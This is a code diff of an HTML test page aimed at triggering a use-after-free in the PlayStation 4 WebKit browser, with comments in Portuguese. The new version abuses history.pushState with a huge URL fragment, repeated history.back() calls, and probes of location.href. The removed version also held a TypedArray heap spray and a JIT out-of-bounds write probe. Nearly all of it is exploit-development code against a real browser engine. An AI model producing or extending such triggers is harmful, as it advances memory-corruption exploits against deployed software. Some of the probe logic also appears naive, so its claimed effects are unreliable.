@@ -1,142 +1,101 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS4 WebKit FW12.00 — UAF Stable Trigger + Tests</title>
+<meta charset="utf-8">
+<title>PS4 WebKit UAF – Trigger Fixado + Testes</title>
+<style>
+body { font-family: monospace; background: #000; color: #0f0; }
+button { margin: 5px; padding: 10px; }
+pre { white-space: pre-wrap; }
+</style>
 </head>
 <body>
 
-<h1>FW12.00 — UAF Stable Trigger (Mandatory)</h1>
-<button onclick="run()">RUN TEST</button>
+<h2>UAF Trigger Fixado (Iteração 48)</h2>
+
+<button onclick="runTest()">RUN TEST</button>
+
 <pre id="log"></pre>
 
 <script>
+const logEl = document.getElementById("log");
 function log(s) {
-    document.getElementById("log").textContent += s + "\n";
+    logEl.textContent += s + "\n";
 }
 
-function sleep(ms) {
-    return new Promise(r => setTimeout(r, ms));
-}
+/* ===========================
+   CONSTANTES DO BUG (FIXAS)
+   =========================== */
+const BIG_FRAGMENT_SIZE = 340356;
+const ITERATIONS = 48;
 
-/* ============================================================
-   PHASE 0 — HARD RESET CONTEXT
-   ============================================================ */
-async function resetEnv() {
-    history.replaceState({init:1}, "", "#INIT");
-    await sleep(50);
-}
-
-/* ============================================================
-   PHASE 1 — MANDATORY UAF TRIGGER (DO NOT TOUCH)
-   ============================================================ */
+/* ===========================
+   TRIGGER UAF (OBRIGATÓRIO)
+   =========================== */
 async function triggerUAF() {
     log("=== UAF TRIGGER START ===");
 
-    const BIG = "A".repeat(340356);   // valor já validado
-    const SMALL = "X";
+    const big = "A".repeat(BIG_FRAGMENT_SIZE);
 
-    // Estado A — fragmento grande
-    history.pushState({A:1}, "", "#" + BIG);
+    /* Estado A — fragmento grande */
+    history.pushState({A:1}, "", "#" + big);
 
-    // Estado B — fragmento pequeno
-    history.replaceState({B:2}, "", "#" + SMALL);
+    /* Estado B — fragmento pequeno (colisão) */
+    history.replaceState({B:2}, "", "#X");
 
-    // Janela crítica — reentrada
-    for (let i = 0; i <= 42; i += 6) {
+    /* Reentrada crítica */
+    for (let i = 0; i < ITERATIONS; i += 6) {
         history.back();
-        await sleep(0);
+        await new Promise(r => setTimeout(r, 0));
         log("[ITER " + i + "] back() async");
     }
 
     log(">>> UAF WINDOW <<<");
 }
 
-/* ============================================================
-   PHASE 2 — CONFIRMAÇÃO DE UAF (PRESSÃO REAL)
-   ============================================================ */
-function confirmUAF() {
-    let s = location.href;
-
-    log("");
-    log("=== BASELINE READ ===");
-    log("URL.length = " + s.length);
-    log("charCodeAt(32) = " + s.charCodeAt(32));
-    log("charCodeAt(64) = " + s.charCodeAt(64));
-    log("charCodeAt(128) = " + s.charCodeAt(128));
-    log("charCodeAt(256) = " + s.charCodeAt(256));
-
-    // Heurística mínima: fragment colapsado + NaN
-    if (s.length < 100 && isNaN(s.charCodeAt(64))) {
-        log("=== UAF CONFIRMED ===");
-        return true;
-    }
-
-    log("=== UAF NOT CONFIRMED — ABORTING TESTS ===");
-    return false;
+/* ===========================
+   TESTE BASE (PROBE CANÔNICO)
+   =========================== */
+function baselineProbe(tag) {
+    const s = location.href;
+    log(tag + " URL.length = " + s.length);
+    log(tag + " charCodeAt(32) = " + s.charCodeAt(32));
+    log(tag + " charCodeAt(64) = " + s.charCodeAt(64));
+    log(tag + " charCodeAt(128) = " + s.charCodeAt(128));
+    log(tag + " charCodeAt(256) = " + s.charCodeAt(256));
 }
 
-/* ============================================================
-   PHASE 3 — TESTES (SÓ RODAM SE UAF EXISTIR)
-   ============================================================ */
-function testTypedArrays() {
-    log("");
-    log("=== TEST: TypedArray Slot Pressure ===");
-    let arr = [];
-    for (let i = 0; i < 6000; i++) {
-        arr.push(new Uint32Array(8));
-    }
-    log("TypedArrays sprayed: " + arr.length);
-}
+/* ===========================
+   TESTE PRINCIPAL
+   =========================== */
+async function runTest() {
+    logEl.textContent = "";
 
-function testJIT() {
-    log("");
-    log("=== TEST: JIT Probe ===");
-    function jit(v) {
-        let a = new Uint32Array(4);
-        a[0] = v;
-        return a[0];
-    }
-    for (let i = 0; i < 20000; i++) jit(i);
+    /* BASELINE LIMPO */
+    log("=== BASELINE ===");
+    baselineProbe("[BASE]");
 
-    let fake = new Uint32Array(4);
-    fake.length = 4096;
-
-    try {
-        fake[16] = 0xdeadbeef;
-        log("JIT write/read idx16 = 0x" + fake[16].toString(16));
-    } catch (e) {
-        log("JIT exception");
-    }
-}
-
-function testHistoryState() {
-    log("");
-    log("=== TEST: History.state reuse ===");
-    let st = history.state;
-    log("typeof state = " + typeof st);
-    log("JSON = " + JSON.stringify(st));
-}
-
-/* ============================================================
-   MAIN
-   ============================================================ */
-async function run() {
-    document.getElementById("log").textContent = "";
-    await resetEnv();
-
+    /* TRIGGER UAF (NÃO OPCIONAL) */
     await triggerUAF();
 
-    if (!confirmUAF())
-        return;
+    /* LEITURA IMEDIATA (SAME FRAME) */
+    log("\n=== POST-UAF (SAME FRAME) ===");
+    baselineProbe("[POST]");
 
-    // Só aqui os testes começam
-    testTypedArrays();
-    testJIT();
-    testHistoryState();
+    /* COLAPSO DO FRAGMENTO */
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    location.hash = "#Z";
 
-    log("");
-    log("=== TEST END ===");
+    /* LEITURA IMEDIATA */
+    log("\n=== POST-COLLAPSE (SAME FRAME) ===");
+    baselineProbe("[COLLAPSE]");
+
+    /* LEITURA ATRASADA */
+    await new Promise(r => setTimeout(r, 0));
+    log("\n=== POST-COLLAPSE (DELAYED) ===");
+    baselineProbe("[DELAYED]");
+
+    log("\n=== TEST END ===");
 }
 </script>
 
